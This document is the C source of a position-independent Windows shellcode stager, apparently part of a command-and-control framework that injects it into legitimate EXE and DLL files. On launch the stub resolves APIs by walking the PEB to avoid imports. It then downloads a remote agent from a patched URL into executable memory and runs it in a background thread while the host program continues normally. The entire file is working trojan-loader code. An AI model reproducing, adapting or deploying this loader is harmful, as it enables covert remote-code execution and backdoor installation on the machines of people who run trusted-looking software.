/*
 * Position-independent Windows loader stub (compiled to flat shellcode).
 *
 * Injected by the C2 "Native Binder" into a host PE: a new .c2 section is added
 * and the entry point is repointed here. At runtime this stub:
 *   1. Resolves kernel32 + APIs via a PEB/Ldr walk (no imports, no CRT).
 *   2. Spawns a background thread that downloads the Position-Independent-Agent
 *      (PIA) .bin from the patched URL over WinINet and runs it in-memory.
 *   3. Resumes the host's original entry point so the legit binary runs normally.
 *
 * One source builds both x64 and x86 (offsets and calling conventions selected
 * by __x86_64__). x64 is shipped; x86 compiles cleanly but is not position-
 * independent (no RIP-relative addressing), so it is not published — see README.
 *
 * Two fields are patched by the binder at bind time (both ASCII-findable so the
 * shared LoaderUrlPatcher works):
 *   - SHELLCODE_URL_PLACEHOLDER : 256-byte slot holding the agent URL.
 *   - C2OEPRAV                  : 8-byte ASCII marker. The host's original
 *                                 entry-point RVA (uint32 LE) is patched into the
 *                                 bytes at marker+4 (overwriting the 'PRAV' half)
 *                                 and read back with volatile at runtime.
 *
 * Build (CI): mingw gcc -ffreestanding ... then ld + objcopy → flat
 * stub-x64-exe.bin / stub-x64-dll.bin. See stub.ld + build.sh / release.yml.
 */

#include <intrin.h> /* provides __readgsqword / __readfsdword as inline intrinsics (no CRT) */

/* Entry-point mode: exactly one of BUILD_FOR_DLL / BUILD_FOR_EXE must be defined
 * on the compile line (see README). The binder picks the variant matching the
 * host it injects into. */
#if defined(BUILD_FOR_DLL) && defined(BUILD_FOR_EXE)
#error "Define only one of BUILD_FOR_DLL or BUILD_FOR_EXE, not both."
#endif

#ifdef __x86_64__
typedef unsigned long long uptr;
#define PEB() ((uptr)__readgsqword(0x60))
#define LDR_OFF 0x18
#define INMEM_OFF 0x20
#define INLOAD_OFF 0x10
#define DBASE_INMEM 0x20    /* DllBase offset from an InMemoryOrderLinks node */
#define BASENAME_INMEM 0x48 /* BaseDllName (UNICODE_STRING) offset from an InMemoryOrderLinks node */
#define BUFPTR_OFF 0x08     /* Buffer field offset within a UNICODE_STRING (ptr-aligned) */
#define DBASE_INLOAD 0x30   /* DllBase offset from an InLoadOrderLinks node   */
#define EXPDIR_OFF 0x88     /* export-directory data-dir RVA field, at base + e_lfanew + EXPDIR_OFF */
#else
typedef unsigned int uptr; /* pointers are 32-bit on x86 */
#define PEB() ((uptr)__readfsdword(0x30))
#define LDR_OFF 0x0C
#define INMEM_OFF 0x14
#define INLOAD_OFF 0x0C
#define DBASE_INMEM 0x10
#define BASENAME_INMEM 0x24 /* BaseDllName (UNICODE_STRING) offset from an InMemoryOrderLinks node */
#define BUFPTR_OFF 0x04     /* Buffer field offset within a UNICODE_STRING */
#define DBASE_INLOAD 0x18
#define EXPDIR_OFF 0x78     /* export-directory data-dir RVA field, at base + e_lfanew + EXPDIR_OFF */
#endif

typedef unsigned int u32;
typedef unsigned short u16;

/* ── Named offsets / flags (arch-independent) ─────────────────────────────── */
#define E_LFANEW_OFF 0x3c              /* IMAGE_DOS_HEADER.e_lfanew */
#define EXP_NUMFUNCS_OFF 0x14          /* IMAGE_EXPORT_DIRECTORY.NumberOfFunctions */
#define EXP_NUMNAMES_OFF 0x18          /* IMAGE_EXPORT_DIRECTORY.NumberOfNames */
#define EXP_FUNCS_OFF 0x1c             /* IMAGE_EXPORT_DIRECTORY.AddressOfFunctions */
#define EXP_NAMES_OFF 0x20             /* IMAGE_EXPORT_DIRECTORY.AddressOfNames */
#define EXP_ORDS_OFF 0x24              /* IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals */

#define AGENT_BUF_SIZE 0x400000u       /* 4 MiB download buffer (VirtualAlloc) */
#define AGENT_CHUNK_SIZE 0x100000u     /* max bytes per InternetReadFile call  */
#define MEM_COMMIT_RESERVE 0x3000u     /* MEM_COMMIT | MEM_RESERVE */
#define PAGE_EXECUTE_READWRITE 0x40u
#define INTERNET_FLAG_RELOAD_NOCACHE 0x84000000u /* INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE */
#define DLL_PROCESS_ATTACH 1u

/* ── API function-pointer types ───────────────────────────────────────────── */
typedef void *(WINAPI *GetProcAddress_t)(void *hModule, const char *name);
typedef void *(WINAPI *LoadLibraryA_t)(const char *lib);

typedef void *(WINAPI *VirtualAlloc_t)(
    void *addr,
    uptr size,
    u32 allocType,
    u32 protect);

typedef void *(WINAPI *CreateThread_t)(
    void *sa,
    uptr stack,
    u32(WINAPI *start)(void *),
    void *param,
    u32 flags,
    u32 *tid);

typedef void *(WINAPI *InternetOpenA_t)(
    const char *agent,
    u32 access,
    const char *proxy,
    const char *bypass,
    u32 flags);

typedef void *(WINAPI *InternetOpenUrlA_t)(
    void *hInternet,
    const char *url,
    const char *headers,
    u32 hlen,
    u32 flags,
    uptr ctx);

typedef int(WINAPI *InternetReadFile_t)(
    void *hFile,
    void *buf,
    u32 toRead,
    u32 *bytesRead);

typedef int(WINAPI *InternetCloseHandle_t)(void *hInternet);

/* APIs resolved at runtime for the download stage. CreateThread is resolved
 * directly at the entry point (it lives in a different stage), so it is not
 * stored here. */
struct API
{
    LoadLibraryA_t pLoadLibraryA;
    VirtualAlloc_t pVirtualAlloc;
    InternetOpenA_t pInternetOpenA;
    InternetOpenUrlA_t pInternetOpenUrlA;
    InternetReadFile_t pInternetReadFile;
    InternetCloseHandle_t pInternetCloseHandle;
};

/* ── Helpers ──────────────────────────────────────────────────────────────── */

static int streq(const char *a, const char *b)
{
    while (*a && *b)
    {
        if (*a != *b)
            return 0;
        a++;
        b++;
    }
    return *a == *b;
}

/* Normalize one UTF-16 code unit into a lowercase ASCII byte ('A'–'Z' → 'a'–'z';
 * every other code unit narrows to char unchanged). This is the single place
 * that knows how to make a wide char comparable to an ASCII literal. */
static char to_lower_ascii(u16 c)
{
    if (c >= 'A' && c <= 'Z')
        return (char)(c + 'a' - 'A');
    return (char)c;
}

/* Compare a UTF-16LE module basename against an ASCII literal for equality,
 * delegating all normalization to to_lower_ascii. The literal may be passed
 * with or without the file extension: "kernel32" matches L"kernel32.dll" but
 * not L"kernelbase.dll". Returns 1 on match. */
static int name_ieq(const u16 *wide, u32 wchars, const char *ascii)
{
    u32 i;
    for (i = 0; i < wchars; i++)
    {
        char a = to_lower_ascii(wide[i]);
        char b = ascii[i];

        if (b == 0)
            /* literal ended: basename must end here or at its extension dot */
            return a == '.' || a == 0;
        if (a != to_lower_ascii((u16)(unsigned char)b))
            return 0;
    }
    /* basename ended: a match only if the literal ended too (full match) */
    return ascii[i] == 0;
}

/* GetModuleHandle-style lookup: walk PEB.Ldr.InMemoryOrderModuleList and return
 * the base of the loaded module whose basename matches `name` (case-insensitive,
 * extension optional). Returns 0 if not found. Matching by name (not fixed list
 * position) survives module load-order differences across Windows builds. */
static uptr get_module_base(const char *name)
{
    uptr peb = PEB();
    uptr ldr = *(uptr *)(peb + LDR_OFF);
    uptr head = ldr + INMEM_OFF; /* &InMemoryOrderModuleList (list sentinel) */
    uptr cur = *(uptr *)head;    /* first entry's InMemoryOrderLinks */

    while (cur != head)
    {
        u32 wbytes = *(u16 *)(cur + BASENAME_INMEM);
        u16 *wname = (u16 *)*(uptr *)(cur + BASENAME_INMEM + BUFPTR_OFF);
        uptr base = *(uptr *)(cur + DBASE_INMEM);

        if (base && wname && name_ieq(wname, wbytes / 2, name))
            return base;

        cur = *(uptr *)cur; /* advance via Flink */
    }
    return 0;
}

/* kernel32.dll — the bootstrap module the stub resolves its first exports from. */
static uptr kernel32_base(void)
{
    return get_module_base("kernel32");
}

/* GetProcAddress-style lookup via a manual IMAGE_EXPORT_DIRECTORY parse.
 * Returns the resolved function address (base + RVA), or 0 if not found, the
 * module has no exports, the ordinal is out of range, or the export is a
 * forwarder string (none of our bootstrap targets are forwarded). */
static void *resolve_export(uptr base, const char *name)
{
    u32 e_lfanew = *(u32 *)(base + E_LFANEW_OFF);
    u32 expDirRva = *(u32 *)(base + e_lfanew + EXPDIR_OFF);
    if (!expDirRva)
        return 0; /* module has no export directory */
    uptr expDir = base + expDirRva;
    u32 expDirSize = *(u32 *)(base + e_lfanew + EXPDIR_OFF + 4);

    u32 numNames = *(u32 *)(expDir + EXP_NUMNAMES_OFF);
    u32 numFuncs = *(u32 *)(expDir + EXP_NUMFUNCS_OFF);
    uptr names = base + *(u32 *)(expDir + EXP_NAMES_OFF);
    uptr funcs = base + *(u32 *)(expDir + EXP_FUNCS_OFF);
    uptr ords = base + *(u32 *)(expDir + EXP_ORDS_OFF);

    for (u32 i = 0; i < numNames; i++)
    {
        const char *expName = (const char *)(base + *(u32 *)(names + i * 4));
        if (streq(expName, name))
        {
            u16 ord = *(u16 *)(ords + i * 2);
            if ((u32)ord >= numFuncs)
                return 0; /* ordinal out of range */
            u32 funcRva = *(u32 *)(funcs + ord * 4);
            /* forwarder: RVA points inside the export directory itself */
            if (funcRva >= expDirRva && funcRva < expDirRva + expDirSize)
                return 0;
            return (void *)(base + funcRva);
        }
    }
    return 0;
}

/* ── Background download + execute ────────────────────────────────────────── */
char g_url[256] = "SHELLCODE_URL_PLACEHOLDER";

/* Resolve every API the stager needs into *api, zeroing each slot first so any
 * unresolved one is a safe NULL rather than stack garbage. Loads wininet.dll and
 * resolves its exports too. Returns 0 if any required pointer is missing, so the
 * caller never invokes a garbage/null slot. */
static int resolve_apis(struct API *api)
{
    api->pLoadLibraryA = 0;
    api->pVirtualAlloc = 0;
    api->pInternetOpenA = 0;
    api->pInternetOpenUrlA = 0;
    api->pInternetReadFile = 0;
    api->pInternetCloseHandle = 0;

    uptr k32 = kernel32_base();
    if (!k32)
        return 0;

    api->pLoadLibraryA = (LoadLibraryA_t)resolve_export(k32, "LoadLibraryA");
    api->pVirtualAlloc = (VirtualAlloc_t)resolve_export(k32, "VirtualAlloc");
    if (!api->pLoadLibraryA || !api->pVirtualAlloc)
        return 0;

    uptr wininet = (uptr)api->pLoadLibraryA("wininet.dll");
    if (!wininet)
        return 0;

    api->pInternetOpenA = (InternetOpenA_t)resolve_export(wininet, "InternetOpenA");
    api->pInternetOpenUrlA = (InternetOpenUrlA_t)resolve_export(wininet, "InternetOpenUrlA");
    api->pInternetReadFile = (InternetReadFile_t)resolve_export(wininet, "InternetReadFile");
    api->pInternetCloseHandle = (InternetCloseHandle_t)resolve_export(wininet, "InternetCloseHandle");
    if (!api->pInternetOpenA || !api->pInternetOpenUrlA ||
        !api->pInternetReadFile || !api->pInternetCloseHandle)
        return 0;

    return 1;
}

/* Open the WinINet session and the agent URL. *phInternet receives the session
 * handle (for later close on any exit path); returns the URL handle or NULL. */
static void *open_agent_url(struct API *api, const char *url, void **phInternet)
{
    void *hInternet = api->pInternetOpenA(0, 0, 0, 0, 0);
    if (!hInternet)
        return 0;
    *phInternet = hInternet;
    return api->pInternetOpenUrlA(hInternet, url, 0, 0, INTERNET_FLAG_RELOAD_NOCACHE, 0);
}

/* Stream the agent into buf (capacity AGENT_BUF_SIZE) until EOF, error, or full.
 * Bounds every read so we never write past the buffer, and trusts the BOOL
 * return while resetting the byte counter each call — so a failed read can't
 * reuse a stale counter and spin. Returns the number of bytes downloaded. */
static uptr read_agent_blob(struct API *api, void *hUrl, void *buf)
{
    uptr off = 0;
    for (;;)
    {
        if (off >= AGENT_BUF_SIZE)
            break; /* buffer full */
        u32 want = AGENT_CHUNK_SIZE;
        if (want > AGENT_BUF_SIZE - off)
            want = (u32)(AGENT_BUF_SIZE - off);
        u32 got = 0;
        int ok = api->pInternetReadFile(hUrl, (char *)buf + off, want, &got);
        if (!ok || got == 0)
            break; /* error or clean EOF */
        off += got;
    }
    return off;
}

/* Stager thread: resolve APIs, fetch the agent over WinINet into an RWX buffer,
 * then jump into it. The buffer is intentionally never freed — it becomes the
 * running agent's memory. param is unused; the host's _start owns no data for us. */
static u32 WINAPI download_thread(void *param)
{
    (void)param;
    struct API api;
    if (!resolve_apis(&api))
        return 0;

    g_url[sizeof(g_url) - 1] = 0; /* defensive NUL cap before InternetOpenUrlA */

    void *hInternet = 0;
    void *hUrl = open_agent_url(&api, g_url, &hInternet);
    if (!hUrl)
    {
        if (hInternet)
            api.pInternetCloseHandle(hInternet);
        return 0;
    }

    void *buf = api.pVirtualAlloc(0, AGENT_BUF_SIZE, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!buf)
    {
        api.pInternetCloseHandle(hUrl);
        api.pInternetCloseHandle(hInternet);
        return 0;
    }

    uptr off = read_agent_blob(&api, hUrl, buf);

    api.pInternetCloseHandle(hUrl);
    api.pInternetCloseHandle(hInternet);

    if (off)
        return ((u32 (*)(void))buf)(); /* run the PIC agent */
    return 0;
}

/* Read the binder-patched original entry-point RVA. Both volatile qualifiers are
 * load-bearing: they defeat the -O2 constant-fold that historically erased the
 * C2OEPRAV marker (see commit b16577e). The 8-byte ASCII literal is what the
 * binder grep-locates; the RVA is patched into its +4 bytes. */
static u32 read_original_oep(void)
{
    volatile char c2_oep[8] = "C2OEPRAV";
    return *(volatile u32 *)(c2_oep + 4);
}

/* ── Entry (placed first in .text via section attr) ───────────────────────── */

#if defined(BUILD_FOR_DLL)

/* DLL entry: the binder wires this stub in as the host DLL's DllMain. hinstDLL
 * is the image base; on DLL_PROCESS_ATTACH we spawn the stager thread, then
 * tail-call the original DllMain at base + OEP RVA. */
__attribute__((section(".text.start"), used)) int WINAPI _start(void *hinstDLL,
                                                                int fdwReason,
                                                                void *lpReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        uptr k32 = kernel32_base();
        if (!k32)
            return 0;
        CreateThread_t pCreateThread = (CreateThread_t)resolve_export(k32, "CreateThread");
        if (pCreateThread)
            pCreateThread(0, 0, download_thread, 0, 0, 0);
    }

    u32 oep = read_original_oep();
    return ((int WINAPI (*)(void *, int, void *))((uptr)hinstDLL + oep))(hinstDLL, fdwReason, lpReserved);
}

#elif defined(BUILD_FOR_EXE)

/* EXE entry: the binder repoints the host EXE's entry point here. An EXE entry
 * receives no image-base argument, so derive the base from
 * PEB.Ldr.InLoadOrderModuleList[0] (the EXE itself), spawn the stager thread,
 * then jump to the original OEP. */
__attribute__((section(".text.start"), used)) void _start(void)
{
    uptr k32 = kernel32_base();
    if (!k32)
        return;

    CreateThread_t pCreateThread = (CreateThread_t)resolve_export(k32, "CreateThread");
    if (pCreateThread)
        pCreateThread(0, 0, download_thread, 0, 0, 0);

    /* Resume the host: exe base (PEB.Ldr.InLoadOrderModuleList[0]) + patched OEP RVA. */
    uptr peb = PEB();
    uptr ldr = *(uptr *)(peb + LDR_OFF);
    uptr first = *(uptr *)(ldr + INLOAD_OFF);
    uptr base = *(uptr *)(first + DBASE_INLOAD);

    u32 oep = read_original_oep();
    ((void (*)(void))(base + oep))();

    /* Never reached: a real CRT entry never returns. Spin so this void entry
     * never falls off the end. */
    for (;;)
    {
    }
}
#endif
